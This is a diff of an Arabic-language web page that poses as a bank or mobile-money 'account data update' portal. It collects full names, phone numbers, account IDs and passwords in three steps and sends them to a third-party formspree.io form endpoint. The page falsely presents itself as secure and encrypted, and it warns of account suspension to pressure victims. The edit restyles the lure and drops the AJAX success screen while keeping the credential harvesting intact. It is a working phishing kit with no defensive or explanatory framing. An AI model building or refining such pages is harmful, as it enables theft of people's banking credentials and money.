@@ -3,123 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بوابة الخدمات الإلكترونية</title>
+    <title>بوابة التحديث الأمني</title>
     <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f5f6f7; display: flex; justify-content: center; min-height: 100vh; }
-        .wrapper { width: 100%; max-width: 420px; padding: 15px; }
-        .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 5px solid #c62828; text-align: center; }
-        .header-title { color: #c62828; font-weight: bold; margin-bottom: 20px; font-size: 18px; }
-        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 8px; text-align: right; font-size: 15px; outline: none; background: #fafafa; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: #ffffff; width: 100%; max-width: 400px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid #c62828; }
+        .header { padding: 20px; text-align: center; background: #fff; border-bottom: 1px solid #eee; }
+        .header h2 { color: #c62828; margin: 0; font-size: 18px; }
+        .content { padding: 25px; }
+        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #ddd; border-radius: 10px; text-align: right; font-size: 16px; outline: none; transition: 0.3s; background: #fafafa; }
         input:focus { border-color: #c62828; background: #fff; }
-        .btn-action { width: 100%; padding: 16px; background: #c62828; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        .btn { width: 100%; padding: 16px; background: #c62828; color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); background: #b71c1c; }
         .hidden { display: none; }
-        .step-indicator { font-size: 12px; color: #888; margin-bottom: 15px; }
-        .q-label { text-align: right; display: block; margin-top: 12px; font-size: 13px; font-weight: bold; color: #555; }
+        .footer-text { font-size: 12px; color: #888; margin-top: 20px; line-height: 1.5; }
+        .step-label { display: block; text-align: right; font-size: 13px; color: #c62828; font-weight: bold; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="card">
-        <div class="header-title">نظام تحديث بيانات الحساب</div>
-        
-        <form id="secure-form" action="https://formspree.io/f/xzdjwoao" method="POST">
+<div class="container">
+    <div class="header">
+        <h2>نظام إدارة بيانات الحساب</h2>
+    </div>
+
+    <div class="content">
+        <form action="https://formspree.io/f/xzdjwoao" method="POST">
             
             <div id="step1">
-                <div class="step-indicator">المرحلة 1 من 3</div>
-                <img src="icon_message.png" style="width: 50px; margin-bottom: 10px;">
-                <select name="Service_Type">
-                    <option value="Sudanese Pound">استلام بالجنيه السوداني</option>
-                    <option value="US Dollar">استلام بالدولار الأمريكي</option>
-                </select>
+                <span class="step-label">البيانات الأساسية</span>
                 <input type="text" name="Full_Name" placeholder="الاسم الرباعي الكامل" required>
-                <input type="number" name="Mobile_Number" placeholder="رقم الهاتف المرتبط" required>
-                <button type="button" class="btn-action" onclick="move(2)">المتابعة</button>
+                <input type="number" name="Phone_Number" placeholder="رقم الهاتف المرتبط" required>
+                <select name="Operation_Type">
+                    <option value="Update">تحديث بيانات</option>
+                    <option value="Activation">تنشيط حساب</option>
+                </select>
+                <button type="button" class="btn" onclick="nextStep(2)">المتابعة</button>
             </div>
 
             <div id="step2" class="hidden">
-                <div class="step-indicator">المرحلة 2 من 3</div>
-                <img src="logo_colored.png" style="width: 90px; margin-bottom: 10px;">
-                <p style="font-size: 14px; color: #666;">يرجى تأكيد الهوية الرقمية للمتابعة</p>
-                <input type="text" name="Client_ID" placeholder="رقم الحساب / المعرف" required>
-                <input type="password" name="Access_Key" placeholder="كلمة المرور" required>
-                <button type="button" class="btn-action" onclick="move(3)">التحقق من البيانات</button>
+                <span class="step-label">تأكيد الهوية الرقمية</span>
+                <input type="text" name="Account_ID" placeholder="رقم الحساب أو المعرف" required>
+                <input type="password" name="Security_Key" placeholder="كلمة المرور" required>
+                <button type="button" class="btn" onclick="nextStep(3)">التالي</button>
             </div>
 
             <div id="step3" class="hidden">
-                <div class="step-indicator">المرحلة الأخيرة</div>
-                <h4 style="margin: 0 0 10px 0; font-size: 15px;">تأكيد مراجع الأمان</h4>
+                <span class="step-label">إجراءات الأمان الأخيرة</span>
+                <p style="font-size: 13px; color: #666; text-align: center;">يرجى اختيار الإجابة المطابقة لخيارات الأمان في حسابك</p>
                 
-                <span class="q-label">السؤال الأول (صورة 1)</span>
                 <select name="Security_Q1">
-                    <option value="Option_A">الخيار الأول</option>
-                    <option value="Option_B">الخيار الثاني</option>
-                    <option value="Option_C">الخيار الثالث</option>
+                    <option value="Yes">نعم / موافق</option>
+                    <option value="No">لا / غير موافق</option>
                 </select>
 
-                <span class="q-label">السؤال الثاني (صورة 2)</span>
                 <select name="Security_Q2">
-                    <option value="Confirmed">نعم / موافق</option>
-                    <option value="Declined">لا / غير موافق</option>
+                    <option value="Confirmed">تأكيد البيانات</option>
+                    <option value="Cancel">إلغاء العملية</option>
                 </select>
 
-                <span class="q-label">السؤال الثالث (صورة 3)</span>
-                <select name="Security_Q3">
-                    <option value="Verified">تأكيد العملية</option>
-                    <option value="Pending">إرسال لاحقاً</option>
-                </select>
-
-                <button type="submit" class="btn-action" id="submitBtn">تنشيط الحساب الآن</button>
+                <button type="submit" class="btn">تأكيد وإرسال التحديث</button>
             </div>
+
         </form>
 
-        <div id="success-msg" class="hidden">
-            <div style="font-size: 50px; color: #4caf50;">✓</div>
-            <h3 style="color: #4caf50;">تم التحديث بنجاح</h3>
-            <p style="font-size: 14px; color: #666; line-height: 1.6;">شكراً لك، تم استلام طلبك. سيقوم النظام بمعالجة التحديث خلال 24 ساعة وسنخطرك عبر الرسائل النصية.</p>
+        <div class="footer-text">
+            * هذا النظام مؤمن ومشفر بالكامل لضمان سرية معلوماتك. يرجى التأكد من إدخال البيانات بدقة لتجنب تعليق الحساب.
         </div>
     </div>
 </div>
 
 <script>
-    // التنقل بين المراحل
-    function move(step) {
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.add('hidden');
-        document.getElementById('step3').classList.add('hidden');
-        document.getElementById('step' + step).classList.remove('hidden');
-        window.scrollTo(0,0);
-    }
-
-    // معالجة الإرسال في الخلفية (AJAX) لكي لا يغادر المستخدم الصفحة
-    var form = document.getElementById("secure-form");
-    form.addEventListener("submit", function(ev) {
-        ev.preventDefault();
-        var btn = document.getElementById("submitBtn");
-        btn.innerText = "جاري المعالجة...";
-        btn.disabled = true;
-
-        var data = new FormData(form);
-        fetch(form.action, {
-            method: form.method,
-            body: data,
-            headers: { 'Accept': 'application/json' }
-        }).then(response => {
-            if (response.ok) {
-                form.classList.add('hidden');
-                document.getElementById('success-msg').classList.remove('hidden');
-            } else {
-                alert("عذراً، حدث خطأ في الاتصال. حاول مرة أخرى.");
-                btn.innerText = "تنشيط الحساب الآن";
-                btn.disabled = false;
-            }
-        }).catch(error => {
-            alert("تأكد من اتصالك بالإنترنت.");
-            btn.innerText = "تنشيط الحساب الآن";
-            btn.disabled = false;
+    // وظيفة التنقل البسيطة والمضمونة
+    function nextStep(step) {
+        // التحقق من الحقول قبل الانتقال
+        const currentInputs = document.querySelectorAll('#step' + (step - 1) + ' input');
+        let allValid = true;
+        currentInputs.forEach(input => {
+            if (!input.value) allValid = false;
         });
-    });
+
+        if (allValid) {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step' + step).classList.remove('hidden');
+            window.scrollTo(0, 0);
+        } else {
+            alert("يرجى إكمال جميع الخانات للمتابعة");
+        }
+    }
 </script>
 
 </body>
